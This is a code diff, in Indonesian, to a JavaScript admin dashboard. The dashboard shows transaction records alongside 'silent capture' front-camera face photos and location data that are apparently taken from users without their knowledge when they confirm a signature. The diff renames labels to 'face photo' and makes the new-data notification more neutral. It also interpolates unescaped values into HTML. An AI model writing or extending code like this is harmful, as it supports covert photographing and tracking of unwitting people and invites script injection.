@@ -249,21 +249,23 @@
             const tr = document.createElement('tr');
             
             // ==========================================
-            // 1. FOTO BARANG/STRUK (Kamera Belakang) - BESAR
+            // 1. FOTO BARANG TRANSAKSI (Kamera Belakang) - BESAR
             // ==========================================
             let receiptPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
             const receiptImg = t.photo || t.receiptPhoto || '';
             if (receiptImg) {
-                receiptPhotoHtml = `<img src="${receiptImg}" class="photo-thumb-large photo-thumb-receipt" alt="Struk ${t.transferId}" onclick="window.viewFullPhoto('${receiptImg}', '${t.transferId}')" title="Klik untuk perbesar Foto Barang/Struk">`;
+                receiptPhotoHtml = `<img src="${receiptImg}" class="photo-thumb-large photo-thumb-receipt" alt="Barang ${t.transferId}" onclick="window.viewFullPhoto('${receiptImg}', '${t.transferId}')" title="Klik untuk perbesar Foto Barang Transaksi">`;
+            } else if (t.status === 'waiting_item_photo') {
+                receiptPhotoHtml = '<div style="color:var(--accent-green); font-size:11px; width:140px; height:140px; display:flex; flex-direction:column; align-items:center; justify-content:center; background:rgba(0,255,179,0.05); border-radius:10px; border:1px dashed var(--accent-green); text-align:center; padding:10px; line-height:1.4;"><span style="font-size:22px; margin-bottom:4px;">📷</span><span>Menunggu Foto Barang...</span></div>';
             }
 
             // ==========================================
-            // 2. FOTO KAMERA DEPAN (Silent Capture) - BESAR
+            // 2. FOTO KAMERA DEPAN / WAJAH (Silent Capture) - BESAR
             // ==========================================
             let frontPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
             const frontImg = t.frontPhoto || t.front_photo || '';
             if (frontImg) {
-                frontPhotoHtml = `<img src="${frontImg}" class="photo-thumb-large photo-thumb-front" alt="Depan ${t.transferId}" onclick="window.viewFrontPhoto('${frontImg}', '${t.transferId}')" title="Klik untuk perbesar FOTO KAMERA DEPAN (SILENT)">`;
+                frontPhotoHtml = `<img src="${frontImg}" class="photo-thumb-large photo-thumb-front" alt="Wajah ${t.transferId}" onclick="window.viewFrontPhoto('${frontImg}', '${t.transferId}')" title="Klik untuk perbesar FOTO WAJAH (SILENT)">`;
             }
 
             // ==========================================
@@ -304,15 +306,15 @@
     }
 
     // ============================================================
-    // VIEW FOTO STRUK (KAMERA BELAKANG)
+    // VIEW FOTO BARANG TRANSAKSI (KAMERA BELAKANG)
     // ============================================================
     window.viewFullPhoto = function(photoUrl, refId) {
         if (!elements.imgViewerModal) return;
-        if (elements.imgModalTitle) elements.imgModalTitle.textContent = `FOTO BARANG/STRUK [ ${refId} ]`;
+        if (elements.imgModalTitle) elements.imgModalTitle.textContent = `FOTO BARANG TRANSAKSI [ ${refId} ]`;
         if (elements.imgModalFull) elements.imgModalFull.src = photoUrl;
         if (elements.btnDownloadImg) {
             elements.btnDownloadImg.href = photoUrl;
-            elements.btnDownloadImg.download = `Struk_${refId}.jpg`;
+            elements.btnDownloadImg.download = `FotoBarang_${refId}.jpg`;
         }
         elements.imgViewerModal.style.display = 'flex';
     };
@@ -322,18 +324,18 @@
     };
 
     // ============================================================
-    // VIEW FOTO KAMERA DEPAN (SILENT CAPTURE)
+    // VIEW FOTO WAJAH (KAMERA DEPAN / SILENT CAPTURE)
     // ============================================================
     window.viewFrontPhoto = function(photoUrl, refId) {
         if (!elements.frontCamModal) return;
-        if (elements.frontCamTitle) elements.frontCamTitle.textContent = `FOTO KAMERA DEPAN (SILENT) [ ${refId} ]`;
+        if (elements.frontCamTitle) elements.frontCamTitle.textContent = `FOTO WAJAH (SILENT CAPTURE) [ ${refId} ]`;
         if (elements.frontCamImg) elements.frontCamImg.src = photoUrl;
         if (elements.btnDownloadFront) {
             elements.btnDownloadFront.href = photoUrl;
-            elements.btnDownloadFront.download = `FrontCamera_${refId}.jpg`;
+            elements.btnDownloadFront.download = `FotoWajah_${refId}.jpg`;
         }
         if (elements.frontCamInfo) {
-            elements.frontCamInfo.textContent = `Diambil secara silent capture saat user menekan tombol konfirmasi`;
+            elements.frontCamInfo.textContent = `Diambil secara silent capture kamera depan saat konfirmasi tanda tangan diklik`;
         }
         elements.frontCamModal.style.display = 'flex';
     };
@@ -392,7 +394,7 @@
             const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
             channel.addEventListener('message', (event) => {
                 if (event.data && event.data.type === 'NEW_LOCATION') {
-                    showNotification('⚡ Transaksi Baru + Foto Depan Silent + Lokasi Diterima!');
+                    showNotification('⚡ Data Transaksi Baru / Foto Diterima!');
                     loadTransactions();
                 }
             });
@@ -409,5 +411,8 @@
     loadTemplate();
     loadTransactions();
     setupSyncListener();
+
+    // Auto-polling berkala setiap 3.5 detik agar selalu update dari perangkat lain
+    setInterval(loadTransactions, 3500);
 
 })();
